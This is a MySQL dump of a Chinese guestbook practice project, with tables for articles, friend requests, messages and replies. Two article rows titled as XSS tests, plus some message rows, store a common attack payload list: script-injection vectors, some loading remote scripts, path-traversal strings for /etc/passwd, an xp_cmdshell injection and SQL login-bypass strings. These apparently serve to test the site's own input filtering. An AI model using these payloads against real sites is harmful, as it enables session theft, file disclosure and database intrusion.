/*
 Navicat Premium Data Transfer

 Source Server         : phpstudy_root_root
 Source Server Type    : MySQL
 Source Server Version : 50553
 Source Host           : localhost:3306
 Source Schema         : testguest

 Target Server Type    : MySQL
 Target Server Version : 50553
 File Encoding         : 65001

 Date: 30/05/2019 16:48:32
*/

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for tg_article
-- ----------------------------
DROP TABLE IF EXISTS `tg_article`;
CREATE TABLE `tg_article`  (
  `tg_id` mediumint(8) NOT NULL AUTO_INCREMENT COMMENT '文章id',
  `tg_username` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '文章作者',
  `tg_type` tinyint(2) NOT NULL COMMENT '文章类型',
  `tg_title` varchar(40) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '文章标题',
  `tg_content` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '文章内容',
  `tg_readcount` smallint(7) NOT NULL DEFAULT 0 COMMENT '文章阅读数量',
  `tg_commentcount` smallint(7) NOT NULL DEFAULT 0 COMMENT '文章评论数量',
  `tg_date` datetime NOT NULL COMMENT '文章发表时间',
  `tg_last_modify_date` datetime DEFAULT NULL COMMENT '文章最后修改时间',
  PRIMARY KEY (`tg_id`) USING BTREE
) ENGINE = MyISAM AUTO_INCREMENT = 6 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of tg_article
-- ----------------------------
INSERT INTO `tg_article` VALUES (1, 'username', 15, '许多的小红花', '许多的小红花许多的小红花许多的小红花许多的小红花许多的小红花许多的小红花许多的小红花许多的小红花许多的小红花许多的小红花\r\n许多的小红花\r\n许多的小红花\r\n许多的小红花', 19, 0, '2019-02-22 00:00:00', '0000-00-00 00:00:00');
INSERT INTO `tg_article` VALUES (2, 'username', 1, 'https://fanyi.baidu.com/#en/zh/Warning%3', '', 30, 0, '2019-02-22 22:13:22', '0000-00-00 00:00:00');
INSERT INTO `tg_article` VALUES (3, 'username', 1, 'xss测试', '\'&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;\n=\'&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;\n&lt;script&gt;alert(document.cookie)&lt;/script&gt;\n&lt;script&gt;alert(vulnerable)&lt;/script&gt;\n%3Cscript%3Ealert(\'XSS\')%3C/script%3E\n&lt;script&gt;alert(\'XSS\')&lt;/script&gt;\n&lt;img src=&quot;javascript:alert(\'XSS\')&quot;&gt;\n%0a%0a&lt;script&gt;alert(\\&quot;Vulnerable\\&quot;)&lt;/script&gt;.jsp\n%22%3cscript%3ealert(%22xss%22)%3c/script%3e\n%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\n%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini\n%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e\n%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e\n%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html\n%3f.jsp\n%3f.jsp\n&lt;script&gt;alert(\'Vulnerable\');&lt;/script&gt;\n&lt;script&gt;alert(\'Vulnerable\')&lt;/script&gt;\n?sql_debug=1\na%5c.aspx\na.jsp/&lt;script&gt;alert(\'Vulnerable\')&lt;/script&gt;\na/\na?&lt;script&gt;alert(\'Vulnerable\')&lt;/script&gt;\n&quot;&gt;&lt;script&gt;alert(\'Vulnerable\')&lt;/script&gt;\n\';exec%20master..xp_cmdshell%20\'dir%20 c:%20&gt;%20c:\\inetpub\\wwwroot\\?.txt\'--&amp;&amp;\n%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E\n%3Cscript%3Ealert(document. domain);%3C/script%3E&amp;\n%3Cscript%3Ealert(document.domain);%3C/script%3E&amp;SESSION_ID={SESSION_ID}&amp;SESSION_ID=\n1%20union%20all%20select%20pass,0,0,0,0%20from%20customers%20where%20fname=\nhttp://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/etc/passwd\n..\\..\\..\\..\\..\\..\\..\\..\\windows\\system.ini\n\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system.ini\n\'\';!--&quot;&lt;XSS&gt;=&amp;{()}\n&lt;IMG src=&quot;javascript:alert(\'XSS\');&quot;&gt;\n&lt;IMG src=javascript:alert(\'XSS\')&gt;\n&lt;IMG src=JaVaScRiPt:alert(\'XSS\')&gt;\n&lt;IMG src=JaVaScRiPt:alert(&quot;XSS&quot;)&gt;\n&lt;IMG src=javascript:alert(\'XSS\')&gt;\n&lt;IMG src=javascript:alert(\'XSS\')&gt;\n&lt;IMG src=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;\n&lt;IMG src=&quot;jav ascript:alert(\'XSS\');&quot;&gt;\n&lt;IMG src=&quot;jav ascript:alert(\'XSS\');&quot;&gt;\n&lt;IMG src=&quot;jav ascript:alert(\'XSS\');&quot;&gt;\n&quot;&lt;IMG src=java\\0script:alert(\\&quot;XSS\\&quot;)&gt;&quot;;\' &gt; out\n&lt;IMG src=&quot; javascript:alert(\'XSS\');&quot;&gt;\n&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;\n&lt;BODY BACKGROUND=&quot;javascript:alert(\'XSS\')&quot;&gt;\n&lt;BODY ONLOAD=alert(\'XSS\')&gt;\n&lt;IMG DYNSRC=&quot;javascript:alert(\'XSS\')&quot;&gt;\n&lt;IMG LOWSRC=&quot;javascript:alert(\'XSS\')&quot;&gt;\n&lt;BGSOUND src=&quot;javascript:alert(\'XSS\');&quot;&gt;\n&lt;br size=&quot;&amp;{alert(\'XSS\')}&quot;&gt;\n&lt;LAYER src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/layer&gt;\n&lt;LINK REL=&quot;stylesheet&quot; href=&quot;javascript:alert(\'XSS\');&quot;&gt;\n&lt;IMG src=\'vbscript:msgbox(&quot;XSS&quot;)\'&gt;\n&lt;IMG src=&quot;mocha:[code]&quot;&gt;\n&lt;IMG src=&quot;livescript:[code]&quot;&gt;\n&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(\'XSS\');&quot;&gt;\n&lt;IFRAME src=javascript:alert(\'XSS\')&gt;&lt;/IFRAME&gt;\n&lt;FRAMESET&gt;&lt;FRAME src=javascript:alert(\'XSS\')&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;\n&lt;TABLE BACKGROUND=&quot;javascript:alert(\'XSS\')&quot;&gt;\n&lt;DIV STYLE=&quot;background-image: url(javascript:alert(\'XSS\'))&quot;&gt;\n&lt;DIV STYLE=&quot;behaviour: url(\'http://www.how-to-hack.org/exploit.html\');&quot;&gt;\n&lt;DIV STYLE=&quot;width: expression(alert(\'XSS\'));&quot;&gt;\n&lt;STYLE&gt;@im\\port\'\\ja\\vasc\\ript:alert(&quot;XSS&quot;)\';&lt;/STYLE&gt;\n&lt;IMG STYLE=\'xss:expre\\ssion(alert(&quot;XSS&quot;))\'&gt;\n&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(\'XSS\');&lt;/STYLE&gt;\n&lt;STYLE TYPE=&quot;text/css&quot;&gt;.XSS{background-image:url(&quot;javascript:alert(\'XSS\')&quot;);}&lt;/STYLE&gt;&lt;A class=&quot;XSS&quot;&gt;&lt;/A&gt;\n&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(\'XSS\')&quot;)}&lt;/STYLE&gt;\n&lt;BASE href=&quot;javascript:alert(\'XSS\');//&quot;&gt;\ngetURL(&quot;javascript:alert(\'XSS\')&quot;)\na=&quot;get&quot;;b=&quot;URL&quot;;c=&quot;javascript:&quot;;d=&quot;alert(\'XSS\');&quot;;eval(a+b+c+d);\n&lt;XML src=&quot;javascript:alert(\'XSS\');&quot;&gt;\n&quot;&gt; &lt;BODY ONLOAD=&quot;a();&quot;&gt;&lt;SCRIPT&gt;function a(){alert(\'XSS\');}&lt;/SCRIPT&gt;&lt;&quot;\n&lt;SCRIPT src=&quot;http://xss.ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;\n&lt;IMG src=&quot;javascript:alert(\'XSS\')&quot;\n&lt;!--#exec cmd=&quot;/bin/echo \'&lt;SCRIPT SRC\'&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo \'=http://xss.ha.ckers.org/a.js&gt;&lt;/SCRIPT&gt;\'&quot;--&gt;\n&lt;IMG src=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;\n&lt;SCRIPT a=&quot;&gt;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;\n&lt;SCRIPT =&quot;&gt;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;\n&lt;SCRIPT a=&quot;&gt;&quot; \'\' src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;\n&lt;SCRIPT &quot;a=\'&gt;\'&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;\n&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;\n&lt;A href=http://www.gohttp://www.google.com/ogle.com/&gt;link&lt;/A&gt;\nadmin\'--\n\' or 0=0 --\n&quot; or 0=0 --\nor 0=0 --\n\' or 0=0 #\n&quot; or 0=0 #\nor 0=0 #\n\' or \'x\'=\'x\n&quot; or &quot;x&quot;=&quot;x\n\') or (\'x\'=\'x\n\' or 1=1--\n&quot; or 1=1--\nor 1=1--\n\' or a=a--\n&quot; or &quot;a&quot;=&quot;a\n\') or (\'a\'=\'a\n&quot;) or (&quot;a&quot;=&quot;a\nhi&quot; or &quot;a&quot;=&quot;a\nhi&quot; or 1=1 --\nhi\' or 1=1 --\nhi\' or \'a\'=\'a\nhi\') or (\'a\'=\'a\nhi&quot;) or (&quot;a&quot;=&quot;a[/code]', 3, 0, '2019-02-22 22:16:11', '0000-00-00 00:00:00');
INSERT INTO `tg_article` VALUES (4, 'username', 16, 'xss测试2', '\\\'&amp;gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;\r\n=\\\'&amp;gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;\r\n&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;\r\n&amp;lt;script&amp;gt;alert(vulnerable)&amp;lt;/script&amp;gt;\r\n%3Cscript%3Ealert(\\\'XSS\\\')%3C/script%3E\r\n&amp;lt;script&amp;gt;alert(\\\'XSS\\\')&amp;lt;/script&amp;gt;\r\n&amp;lt;img src=&amp;quot;javascript:alert(\\\'XSS\\\')&amp;quot;&amp;gt;\r\n%0a%0a&amp;lt;script&amp;gt;alert(\\\\&amp;quot;Vulnerable\\\\&amp;quot;)&amp;lt;/script&amp;gt;.jsp\r\n%22%3cscript%3ealert(%22xss%22)%3c/script%3e\r\n%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\r\n%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini\r\n%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e\r\n%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e\r\n%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html\r\n%3f.jsp\r\n%3f.jsp\r\n&amp;lt;script&amp;gt;alert(\\\'Vulnerable\\\');&amp;lt;/script&amp;gt;\r\n&amp;lt;script&amp;gt;alert(\\\'Vulnerable\\\')&amp;lt;/script&amp;gt;\r\n?sql_debug=1\r\na%5c.aspx\r\na.jsp/&amp;lt;script&amp;gt;alert(\\\'Vulnerable\\\')&amp;lt;/script&amp;gt;\r\na/\r\na?&amp;lt;script&amp;gt;alert(\\\'Vulnerable\\\')&amp;lt;/script&amp;gt;\r\n&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(\\\'Vulnerable\\\')&amp;lt;/script&amp;gt;\r\n\\\';exec%20master..xp_cmdshell%20\\\'dir%20 c:%20&amp;gt;%20c:\\\\inetpub\\\\wwwroot\\\\?.txt\\\'--&amp;amp;&amp;amp;\r\n%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E\r\n%3Cscript%3Ealert(document. domain);%3C/script%3E&amp;amp;\r\n%3Cscript%3Ealert(document.domain);%3C/script%3E&amp;amp;SESSION_ID={SESSION_ID}&amp;amp;SESSION_ID=\r\n1%20union%20all%20select%20pass,0,0,0,0%20from%20customers%20where%20fname=\r\nhttp://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/etc/passwd\r\n..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system.ini\r\n\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system.ini\r\n\\\'\\\';!--&amp;quot;&amp;lt;XSS&amp;gt;=&amp;amp;{()}\r\n&amp;lt;IMG src=&amp;quot;javascript:alert(\\\'XSS\\\');&amp;quot;&amp;gt;\r\n&amp;lt;IMG src=javascript:alert(\\\'XSS\\\')&amp;gt;\r\n&amp;lt;IMG src=JaVaScRiPt:alert(\\\'XSS\\\')&amp;gt;\r\n&amp;lt;IMG src=JaVaScRiPt:alert(&amp;quot;XSS&amp;quot;)&amp;gt;\r\n&amp;lt;IMG src=javascript:alert(\\\'XSS\\\')&amp;gt;\r\n&amp;lt;IMG src=javascript:alert(\\\'XSS\\\')&amp;gt;\r\n&amp;lt;IMG src=&amp;amp;#x6A&amp;amp;#x61&amp;amp;#x76&amp;amp;#x61&amp;amp;#x73&amp;amp;#x63&amp;amp;#x72&amp;amp;#x69&amp;amp;#x70&amp;amp;#x74&amp;amp;#x3A&amp;amp;#x61&amp;amp;#x6C&amp;amp;#x65&amp;amp;#x72&amp;amp;#x74&amp;amp;#x28&amp;amp;#x27&amp;amp;#x58&amp;amp;#x53&amp;amp;#x53&amp;amp;#x27&amp;amp;#x29&amp;gt;\r\n&amp;lt;IMG src=&amp;quot;jav ascript:alert(\\\'XSS\\\');&amp;quot;&amp;gt;\r\n&amp;lt;IMG src=&amp;quot;jav ascript:alert(\\\'XSS\\\');&amp;quot;&amp;gt;\r\n&amp;lt;IMG src=&amp;quot;jav ascript:alert(\\\'XSS\\\');&amp;quot;&amp;gt;\r\n&amp;quot;&amp;lt;IMG src=java\\\\0script:alert(\\\\&amp;quot;XSS\\\\&amp;quot;)&amp;gt;&amp;quot;;\\\' &amp;gt; out\r\n&amp;lt;IMG src=&amp;quot; javascript:alert(\\\'XSS\\\');&amp;quot;&amp;gt;\r\n&amp;lt;SCRIPT&amp;gt;a=/XSS/alert(a.source)&amp;lt;/SCRIPT&amp;gt;\r\n&amp;lt;BODY BACKGROUND=&amp;quot;javascript:alert(\\\'XSS\\\')&amp;quot;&amp;gt;\r\n&amp;lt;BODY ONLOAD=alert(\\\'XSS\\\')&amp;gt;\r\n&amp;lt;IMG DYNSRC=&amp;quot;javascript:alert(\\\'XSS\\\')&amp;quot;&amp;gt;\r\n&amp;lt;IMG LOWSRC=&amp;quot;javascript:alert(\\\'XSS\\\')&amp;quot;&amp;gt;\r\n&amp;lt;BGSOUND src=&amp;quot;javascript:alert(\\\'XSS\\\');&amp;quot;&amp;gt;\r\n&amp;lt;br size=&amp;quot;&amp;amp;{alert(\\\'XSS\\\')}&amp;quot;&amp;gt;\r\n&amp;lt;LAYER src=&amp;quot;http://xss.ha.ckers.org/a.js&amp;quot;&amp;gt;&amp;lt;/layer&amp;gt;\r\n&amp;lt;LINK REL=&amp;quot;stylesheet&amp;quot; href=&amp;quot;javascript:alert(\\\'XSS\\\');&amp;quot;&amp;gt;\r\n&amp;lt;IMG src=\\\'vbscript:msgbox(&amp;quot;XSS&amp;quot;)\\\'&amp;gt;\r\n&amp;lt;IMG src=&amp;quot;mocha:[code]&amp;quot;&amp;gt;\r\n&amp;lt;IMG src=&amp;quot;livescript:[code]&amp;quot;&amp;gt;\r\n&amp;lt;META HTTP-EQUIV=&amp;quot;refresh&amp;quot; CONTENT=&amp;quot;0;url=javascript:alert(\\\'XSS\\\');&amp;quot;&amp;gt;\r\n&amp;lt;IFRAME src=javascript:alert(\\\'XSS\\\')&amp;gt;&amp;lt;/IFRAME&amp;gt;\r\n&amp;lt;FRAMESET&amp;gt;&amp;lt;FRAME src=javascript:alert(\\\'XSS\\\')&amp;gt;&amp;lt;/FRAME&amp;gt;&amp;lt;/FRAMESET&amp;gt;\r\n&amp;lt;TABLE BACKGROUND=&amp;quot;javascript:alert(\\\'XSS\\\')&amp;quot;&amp;gt;\r\n&amp;lt;DIV STYLE=&amp;quot;background-image: url(javascript:alert(\\\'XSS\\\'))&amp;quot;&amp;gt;\r\n&amp;lt;DIV STYLE=&amp;quot;behaviour: url(\\\'http://www.how-to-hack.org/exploit.html\\\');&amp;quot;&amp;gt;\r\n&amp;lt;DIV STYLE=&amp;quot;width: expression(alert(\\\'XSS\\\'));&amp;quot;&amp;gt;\r\n&amp;lt;STYLE&amp;gt;@im\\\\port\\\'\\\\ja\\\\vasc\\\\ript:alert(&amp;quot;XSS&amp;quot;)\\\';&amp;lt;/STYLE&amp;gt;\r\n&amp;lt;IMG STYLE=\\\'xss:expre\\\\ssion(alert(&amp;quot;XSS&amp;quot;))\\\'&amp;gt;\r\n&amp;lt;STYLE TYPE=&amp;quot;text/javascript&amp;quot;&amp;gt;alert(\\\'XSS\\\');&amp;lt;/STYLE&amp;gt;\r\n&amp;lt;STYLE TYPE=&amp;quot;text/css&amp;quot;&amp;gt;.XSS{background-image:url(&amp;quot;javascript:alert(\\\'XSS\\\')&amp;quot;);}&amp;lt;/STYLE&amp;gt;&amp;lt;A class=&amp;quot;XSS&amp;quot;&amp;gt;&amp;lt;/A&amp;gt;\r\n&amp;lt;STYLE type=&amp;quot;text/css&amp;quot;&amp;gt;BODY{background:url(&amp;quot;javascript:alert(\\\'XSS\\\')&amp;quot;)}&amp;lt;/STYLE&amp;gt;\r\n&amp;lt;BASE href=&amp;quot;javascript:alert(\\\'XSS\\\');//&amp;quot;&amp;gt;\r\ngetURL(&amp;quot;javascript:alert(\\\'XSS\\\')&amp;quot;)\r\na=&amp;quot;get&amp;quot;;b=&amp;quot;URL&amp;quot;;c=&amp;quot;javascript:&amp;quot;;d=&amp;quot;alert(\\\'XSS\\\');&amp;quot;;eval(a+b+c+d);\r\n&amp;lt;XML src=&amp;quot;javascript:alert(\\\'XSS\\\');&amp;quot;&amp;gt;\r\n&amp;quot;&amp;gt; &amp;lt;BODY ONLOAD=&amp;quot;a();&amp;quot;&amp;gt;&amp;lt;SCRIPT&amp;gt;function a(){alert(\\\'XSS\\\');}&amp;lt;/SCRIPT&amp;gt;&amp;lt;&amp;quot;\r\n&amp;lt;SCRIPT src=&amp;quot;http://xss.ha.ckers.org/xss.jpg&amp;quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;\r\n&amp;lt;IMG src=&amp;quot;javascript:alert(\\\'XSS\\\')&amp;quot;\r\n&amp;lt;!--#exec cmd=&amp;quot;/bin/echo \\\'&amp;lt;SCRIPT SRC\\\'&amp;quot;--&amp;gt;&amp;lt;!--#exec cmd=&amp;quot;/bin/echo \\\'=http://xss.ha.ckers.org/a.js&amp;gt;&amp;lt;/SCRIPT&amp;gt;\\\'&amp;quot;--&amp;gt;\r\n&amp;lt;IMG src=&amp;quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&amp;quot;&amp;gt;\r\n&amp;lt;SCRIPT a=&amp;quot;&amp;gt;&amp;quot; src=&amp;quot;http://xss.ha.ckers.org/a.js&amp;quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;\r\n&amp;lt;SCRIPT =&amp;quot;&amp;gt;&amp;quot; src=&amp;quot;http://xss.ha.ckers.org/a.js&amp;quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;\r\n&amp;lt;SCRIPT a=&amp;quot;&amp;gt;&amp;quot; \\\'\\\' src=&amp;quot;http://xss.ha.ckers.org/a.js&amp;quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;\r\n&amp;lt;SCRIPT &amp;quot;a=\\\'&amp;gt;\\\'&amp;quot; src=&amp;quot;http://xss.ha.ckers.org/a.js&amp;quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;\r\n&amp;lt;SCRIPT&amp;gt;document.write(&amp;quot;&amp;lt;SCRI&amp;quot;);&amp;lt;/SCRIPT&amp;gt;PT src=&amp;quot;http://xss.ha.ckers.org/a.js&amp;quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;\r\n&amp;lt;A href=http://www.gohttp://www.google.com/ogle.com/&amp;gt;link&amp;lt;/A&amp;gt;\r\nadmin\\\'--\r\n\\\' or 0=0 --\r\n&amp;quot; or 0=0 --\r\nor 0=0 --\r\n\\\' or 0=0 #\r\n&amp;quot; or 0=0 #\r\nor 0=0 #\r\n\\\' or \\\'x\\\'=\\\'x\r\n&amp;quot; or &amp;quot;x&amp;quot;=&amp;quot;x\r\n\\\') or (\\\'x\\\'=\\\'x\r\n\\\' or 1=1--\r\n&amp;quot; or 1=1--\r\nor 1=1--\r\n\\\' or a=a--\r\n&amp;quot; or &amp;quot;a&amp;quot;=&amp;quot;a\r\n\\\') or (\\\'a\\\'=\\\'a\r\n&amp;quot;) or (&amp;quot;a&amp;quot;=&amp;quot;a\r\nhi&amp;quot; or &amp;quot;a&amp;quot;=&amp;quot;a\r\nhi&amp;quot; or 1=1 --\r\nhi\\\' or 1=1 --\r\nhi\\\' or \\\'a\\\'=\\\'a\r\nhi\\\') or (\\\'a\\\'=\\\'a\r\nhi&amp;quot;) or (&amp;quot;a&amp;quot;=&amp;quot;a[/code]', 17, 1, '2019-02-22 22:17:13', '2019-02-25 21:08:40');
INSERT INTO `tg_article` VALUES (5, 'username', 15, '解析UBB帖子 第3次正确的修改', '[size=20]大小[/size]\r\n\r\n[b]加粗[/b]\r\n\r\n[i]斜体[/i]\r\n\r\n[u]下划线[/u]\r\n\r\n[s]删除线[/s]\r\n[img]qpic/2//3.gif[/img][img]qpic/2//3.gif[/img][img]qpic/2//3.gif[/img][img]qpic/2//3.gif[/img]\r\n[size=30]我的天啊，你真瘦[/size]\r\n', 340, 1, '2019-02-23 18:47:19', '2019-02-25 19:11:05');

-- ----------------------------
-- Table structure for tg_flower
-- ----------------------------
DROP TABLE IF EXISTS `tg_flower`;
CREATE TABLE `tg_flower`  (
  `tg_id` mediumint(8) NOT NULL AUTO_INCREMENT COMMENT '//ID',
  `tg_touser` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '收花者',
  `tg_formuser` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '送花者',
  `tg_flower` mediumint(8) NOT NULL COMMENT '花朵个数',
  `tg_content` varchar(200) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '送花感言',
  `tg_date` datetime NOT NULL COMMENT '送花时间',
  PRIMARY KEY (`tg_id`) USING BTREE
) ENGINE = MyISAM AUTO_INCREMENT = 8 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of tg_flower
-- ----------------------------
INSERT INTO `tg_flower` VALUES (1, '2', '3', 2, '2222', '0000-00-00 00:00:00');
INSERT INTO `tg_flower` VALUES (2, 'username', 'username', 99, '49', '2019-02-20 16:49:07');
INSERT INTO `tg_flower` VALUES (3, 'username', 'username', 99, '1', '2019-02-20 16:49:21');
INSERT INTO `tg_flower` VALUES (7, 'xiaobai1', 'xiaobai1', 17, '俺非常的欣赏你，所以给你送一朵小红花~~~', '2019-05-02 15:50:11');

-- ----------------------------
-- Table structure for tg_friend
-- ----------------------------
DROP TABLE IF EXISTS `tg_friend`;
CREATE TABLE `tg_friend`  (
  `tg_id` mediumint(8) NOT NULL AUTO_INCREMENT COMMENT 'ID',
  `tg_touser` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '被添加的好友',
  `tg_fromuser` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '自己',
  `tg_content` varchar(200) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '请求内容',
  `tg_state` tinyint(1) NOT NULL DEFAULT 0 COMMENT '状态|0未验证',
  `tg_date` datetime NOT NULL COMMENT '验证时间',
  PRIMARY KEY (`tg_id`) USING BTREE
) ENGINE = MyISAM AUTO_INCREMENT = 13 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of tg_friend
-- ----------------------------
INSERT INTO `tg_friend` VALUES (1, 's', 'sd', 'ssss', 0, '0000-00-00 00:00:00');
INSERT INTO `tg_friend` VALUES (2, 'usersfvvna', 'usersfvvna', '我非常想和你交朋友~~~', 0, '2019-02-18 16:37:02');
INSERT INTO `tg_friend` VALUES (3, 'username', 'aassdd', '我非常想和你交朋友~~~', 0, '2019-02-18 16:37:50');
INSERT INTO `tg_friend` VALUES (4, 'username', 'usersfvvna', '我非常想和你交朋友~~~', 0, '2019-02-18 16:38:12');
INSERT INTO `tg_friend` VALUES (5, 'username', 'usersfvvna', '我非常想和你交朋友~~~', 1, '2019-02-18 16:40:04');
INSERT INTO `tg_friend` VALUES (9, 'aassdd', 'username', '我发送验证给人家~~~1', 0, '2019-02-18 17:01:31');
INSERT INTO `tg_friend` VALUES (10, 'erernamew', 'username', '我发送验证给人家~~~2', 1, '2019-02-18 19:32:35');
INSERT INTO `tg_friend` VALUES (12, 'absolutely', 'username', '我非常想和你交朋友~~~s', 0, '2019-02-18 20:59:11');

-- ----------------------------
-- Table structure for tg_message
-- ----------------------------
DROP TABLE IF EXISTS `tg_message`;
CREATE TABLE `tg_message`  (
  `tg_id` int(8) NOT NULL AUTO_INCREMENT COMMENT '发信息ID',
  `tg_touser` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '收信人',
  `tg_fromuser` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '发信人',
  `tg_content` varchar(500) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '发信内容',
  `tg_date` datetime NOT NULL COMMENT '发信时间',
  `tg_state` int(2) NOT NULL DEFAULT 0,
  PRIMARY KEY (`tg_id`) USING BTREE
) ENGINE = MyISAM AUTO_INCREMENT = 28 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of tg_message
-- ----------------------------
INSERT INTO `tg_message` VALUES (7, ':你是谁', 'username', 'sssss', '2019-02-15 17:36:46', 0);
INSERT INTO `tg_message` VALUES (8, '你是谁啊啊', 'username', 'sssssdv', '2019-02-15 17:37:38', 0);
INSERT INTO `tg_message` VALUES (10, 'aasda', 'username', '<script>alert(\"1\")</script>', '2019-02-15 23:03:27', 0);
INSERT INTO `tg_message` VALUES (11, 'ript>alert(\"1\")</scr', 'username', '<script>alert(\"1\")</script>', '2019-02-15 23:03:57', 0);
INSERT INTO `tg_message` VALUES (12, 'aassd', 'username', '<script>alert(\"1\")</script>', '2019-02-15 23:05:44', 0);
INSERT INTO `tg_message` VALUES (16, 'usernam', 'username', '最后一次给你机会', '2019-02-16 22:07:35', 0);

-- ----------------------------
-- Table structure for tg_reply
-- ----------------------------
DROP TABLE IF EXISTS `tg_reply`;
CREATE TABLE `tg_reply`  (
  `tg_id` smallint(8) NOT NULL AUTO_INCREMENT COMMENT '评论id',
  `tg_commentid` smallint(8) NOT NULL COMMENT '文章id',
  `tg_username` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '评论者',
  `tg_content` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '评论内容',
  `tg_date` datetime NOT NULL COMMENT '评论时间',
  PRIMARY KEY (`tg_id`) USING BTREE
) ENGINE = MyISAM AUTO_INCREMENT = 16 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of tg_reply
-- ----------------------------
INSERT INTO `tg_reply` VALUES (1, 5, 'username', '这是我的第一个回帖', '2019-02-24 16:17:26');
INSERT INTO `tg_reply` VALUES (2, 5, 'username', '这是我的第一个回帖', '2019-02-24 16:17:26');
INSERT INTO `tg_reply` VALUES (3, 5, 'username', 'sss', '2019-02-24 18:14:05');
INSERT INTO `tg_reply` VALUES (4, 5, 'username', 'ssss', '2019-02-24 18:14:11');
INSERT INTO `tg_reply` VALUES (5, 5, 'username', '1', '2019-02-24 19:00:25');
INSERT INTO `tg_reply` VALUES (6, 5, 'username', '2', '2019-02-24 19:00:32');
INSERT INTO `tg_reply` VALUES (7, 5, 'username', '3', '2019-02-24 19:00:38');
